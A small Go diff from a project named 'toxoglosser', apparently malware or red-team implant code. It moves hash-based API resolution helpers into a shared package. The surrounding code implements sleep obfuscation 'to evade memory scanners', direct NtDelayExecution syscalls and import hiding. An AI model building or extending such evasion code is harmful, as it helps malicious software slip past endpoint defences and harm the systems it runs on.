@@ -10,6 +10,8 @@ import (
 	"syscall"
 	"time"
 	"unsafe"
+
+	"toxoglosser/common"
 )
 
 // SleepObf implements obfuscated sleep to evade memory scanners during delays
@@ -51,7 +53,7 @@ func SleepObfEkkoStyle(duration time.Duration) {
 // ntdllDelayExecution calls NtDelayExecution using direct syscalls
 func ntdllDelayExecution(interval int64) error {
 	// Use our syscall resolution to get the function
-	addr, err := GetProcAddressByHash(windows.Handle(getNtdllHandle()), "NtDelayExecution")
+	addr, err := common.GetProcAddressByHash(windows.Handle(getNtdllHandle()), "NtDelayExecution")
 	if err != nil {
 		return err
 	}
@@ -75,7 +77,7 @@ func ntdllDelayExecution(interval int64) error {
 // getNtdllHandle gets the handle to ntdll.dll
 func getNtdllHandle() uintptr {
 	// Use our manual resolution to avoid LazyDLL
-	handle, err := GetModuleHandleByHash("ntdll.dll")
+	handle, err := common.GetModuleHandleByHash("ntdll.dll")
 	if err != nil {
 		// Fallback
 		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
@@ -92,7 +94,7 @@ func getNtdllHandle() uintptr {
 func NtDelayExecution(alertable bool, delayInterval *int64) error {
 	// Get the function address manually
 	ntdllHandle := getNtdllHandle()
-	addr, err := GetProcAddressByHash(windows.Handle(ntdllHandle), "NtDelayExecution")
+	addr, err := common.GetProcAddressByHash(windows.Handle(ntdllHandle), "NtDelayExecution")
 	if err != nil {
 		return err
 	}
@@ -155,3 +157,4 @@ func AdvancedSleepWithObfuscation(duration time.Duration) {
 		remaining -= thisChunk
 	}
 }
+
